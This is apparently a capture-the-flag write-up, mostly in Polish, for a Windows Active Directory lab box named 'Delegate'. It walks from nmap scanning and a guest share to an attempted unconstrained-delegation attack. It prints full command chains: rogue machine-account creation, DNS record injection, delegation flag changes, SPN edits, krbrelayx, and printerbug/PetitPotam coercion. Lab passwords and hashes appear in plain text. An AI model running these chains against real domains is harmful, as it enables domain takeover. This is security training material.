# Delegate
Windows,Medium, created by **geiseric**

![image](https://github.com/user-attachments/assets/46b6bfe1-3683-44fd-9c68-619751118123)

```
nmap -Pn -v -p- --version-all -oA nmapFULL --max-rate 1500 -A 10.10.113.221
sudo nmap -sU -Pn -A -F -v -oA nmaUDP --max-rate 1500 10.10.113.221
```

```
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-16 07:36:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
57550/tcp open  msrpc         Microsoft Windows RPC
```

![{BCE7DE18-9F41-4EA6-B563-6257377F797B}](https://github.com/user-attachments/assets/a021818e-5d13-413b-9272-2a69d20978bc)


null session nic, ale `guest` coś tam pokazuje.

![{29BC4967-6DF5-4C2C-92C7-A866C0AA6758}](https://github.com/user-attachments/assets/bfd71930-f185-4ee5-8f0f-4b7b94e16e20)

![{BC874D84-D444-4D21-B4BC-01EAA31990F2}](https://github.com/user-attachments/assets/46a649f5-17bc-4af2-ae64-eb46b048604e)

![{D7DDE799-BED0-42E6-8B59-7087330AB659}](https://github.com/user-attachments/assets/9f3f78f7-4b50-4814-8fd4-52148e65c3e0)

![{9D575507-E973-49DD-960E-F92EB01C0485}](https://github.com/user-attachments/assets/6ac53780-6791-4196-9e9d-726174e11b76)

hmmmm. Zaskoczyli xD

![{4124E57C-BEDB-4EB2-BCB0-D5C1CF8495CD}](https://github.com/user-attachments/assets/7097d62c-8b56-4ce8-8f5f-647bdce9a0cc)

to mamy naszą A.Briggs.

![{5EEA8349-3920-44B8-87C9-04F9F16DC7B6}](https://github.com/user-attachments/assets/7f523a51-c3a0-472e-8d49-523e415d5249)

![{AB91B6CC-2912-4CD0-8DD4-CCED4C71B9DB}](https://github.com/user-attachments/assets/876f7fc8-e562-420c-b040-38b29fbc8549)

musiałem force po brakue ssl puścić, bo nie śmigało.

```
certipy-ad find -u A.Briggs -p 'P4ssw0rd1#123' -dc-ip 10.10.113.221 -scheme ldap -old-bloodhound
bloodhound-python -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123' -ns 10.10.113.221 -dc DC1.delegate.vl -c all
```

![{088864BF-B242-434A-B4D9-751C9C292FB6}](https://github.com/user-attachments/assets/8220ff22-4894-4f43-8380-7dac7e6f1c94)

o marnuję czas. Świetnie ;)

![{287534F0-DD59-4EE2-8C34-365D29237F5B}](https://github.com/user-attachments/assets/006f9af9-4494-4722-b996-a801b8e5c007)

wygląda jak easy, a nie medium, ale zobaczmy.
z ciekawości użyłem obu tooli, ale zostanę przy pierwszym.

![{1DFA3DDE-2025-4795-A27F-C81A11BF00AF}](https://github.com/user-attachments/assets/2ec8abf5-5ba6-4be6-b8d1-7ab455dd0beb)

![hash](https://github.com/user-attachments/assets/5fc0c5cd-040b-4c4f-a686-91e07867f2d6)

Dobra mamy wjazd po winrm

![{9C5B3579-44FB-483D-9CE2-7DBE4C1B84CF}](https://github.com/user-attachments/assets/c5b8a012-2f91-49f7-9b98-c29effc08042)

ciekawe rzeczy to `delegation admins` oraz `SeEnableDelegationPrivilege`.
Na wiki dostajemy 2 linki
[https://www.netspi.com/blog/technical-blog/network-penetration-testing/machineaccountquota-is-useful-sometimes/](https://www.netspi.com/blog/technical-blog/network-penetration-testing/machineaccountquota-is-useful-sometimes/)
[https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)

zatem co potrzebujemy
```
https://github.com/Kevin-Robertson/Powermad.git
https://github.com/dirkjanm/krbrelayx.git
```

![{24481739-7BE9-43F6-86D5-39670378D556}](https://github.com/user-attachments/assets/9198822a-1d5d-4ab5-a7e8-4f8519f81e05)

```
. .\Powermad.ps1
New-MachineAccount -MachineAccount PWNED -Password $(ConvertTo-SecureString 'Password1!' -AsPlainText -Force)
Set-MachineAccountAttribute -MachineAccount pwned -Attribute useraccountcontrol -Value 528384
Set-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Value HTTP/PWNED.delegate.vl -Append
Get-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Verbose
```

![{723A0705-CA3A-457D-9B3C-C88EF9CD5BA1}](https://github.com/user-attachments/assets/f9209860-1f5a-4e09-b656-a1149e712a11)

```
python3 dnstool.py -u 'delegate.vl\pwned$' -p 'Password1!' -r PWNED.delegate.vl -d 10.8.4.124 --action add -dns-ip 10.10.126.37 DC1.delegate.vl
python3 printerbug.py delegate.vl/'PWNED$'@dc1.delegate.vl PWNED.delegate.vl
python3 krbrelayx.py -hashes :7FACDC498ED1680C4FD1448319A8C04F
```

![{BB64C83E-996F-4B10-91B7-C5530CFC56C4}](https://github.com/user-attachments/assets/4deda0bb-7d63-4a92-a957-99262eff1191)

- i to wszystko mi nie działa xDDD
- próbuję inną metodą (reset machine).


![{51322923-0381-4E29-B848-1FB96EA9AEEE}](https://github.com/user-attachments/assets/ca9c464b-5958-4afc-9159-67b6ab828d8c)

```
impacket-addcomputer -dc-ip 10.10.114.230 -computer-pass 'Password1!' -computer-name PWNED delegate.vl/N.Thompson:'KALEB_2341'
python3 krbrelayx/dnstool.py -u 'delegate.vl\PWNED$' -p 'Password1!' -r PWNED.delegate.vl -d 10.8.4.124 --action add DC1.delegate.vl -dns-ip 10.10.114.230            
python3 krbrelayx/dnstool.py -u 'delegate.vl\PWNED$' -p 'Password1!' -r PWNED.delegate.vl -d 10.8.4.124 --action add DC1.delegate.vl -dns-ip 10.10.114.230
bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host 'DC1.delegate.vl' add uac 'PWNED$' -f TRUSTED_FOR_DELEGATION
```

![{01ED57C9-C436-42A6-8ACC-49087B7D106E}](https://github.com/user-attachments/assets/96fc9871-7769-4113-966d-74cde2cbcd0f)

```
python3 krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/PWNED.delegate.vl' -t 'PWNED$' -dc-ip 10.10.114.230 DC1.delegate.vl --additional
python3 krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/PWNED.delegate.vl' -t 'PWNED$' -dc-ip 10.10.114.230 DC1.delegate.vl             
python3 krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -q -t 'PWNED$' -dc-ip 10.10.114.230 DC1.delegate.vl                               
```


![{8C620539-0EF4-42BB-AD89-3CE704ACEEC8}](https://github.com/user-attachments/assets/1d09fc3f-efb2-4d04-9eb9-73ec24727ff2)


```
python3 PetitPotam/PetitPotam.py -u 'PWNED$' -p 'Password1!' PWNED.delegate.vl 10.10.114.230
```

![{1E5AB2B6-98AA-47BC-9B31-778784C75683}](https://github.com/user-attachments/assets/f6c8e7b4-c22c-47ad-ac81-ff6490d4072a)

it could give as .ccache file but... it failed.

![{31C076D8-A1B4-4317-AF31-DA0CAE253100}](https://github.com/user-attachments/assets/f62e8e32-484e-48c5-a324-e592fb2f52bd)

it could works too...

## Not Working method
próbuję po raz trzeci.

tym razem haslo do DCka daję `7A21990FCD3D759941E45C490F143D5F` czyli `12345`.

Na starcie uruchamiam 
```
python3 krbrelayx/krbrelayx.py -hashes :7A21990FCD3D759941E45C490F143D5F
```
I teraz po kolei
```
impacket-addcomputer -dc-ip 10.10.88.158 -computer-pass '12345' -computer-name pwned delegate.vl/N.Thompson:'KALEB_2341'
python3 krbrelayx/dnstool.py -u 'delegate.vl\PWNED$' -p '12345' -r PWNED.delegate.vl -d 10.8.4.124 --action add DC1.delegate.vl -dns-ip 10.10.88.158
bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host 'DC1.delegate.vl' add uac 'PWNED$' -f TRUSTED_FOR_DELEGATION
python3 krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/PWNED.delegate.vl' -t 'PWNED$' -dc-ip 10.10.88.158 DC1.delegate.vl --additional
python3 krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/PWNED.delegate.vl' -t 'PWNED$' -dc-ip 10.10.88.158 DC1.delegate.vl   
python3 krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -q -t 'PWNED$' -dc-ip 10.10.88.158 DC1.delegate.vl      
python3 krbrelayx/printerbug.py delegate.vl/PWNED$:'12345'@10.10.88.158 PWNED.delegate.vl
python3 PetitPotam/PetitPotam.py -u 'PWNED$' -p '12345' PWNED.delegate.vl 10.10.88.158
```
Iiiiiii nie działa xD

- zrobiłem 4 razy i nie rozumiem co jest źle. Zobaczyłem writeup i 1:1 robiłem
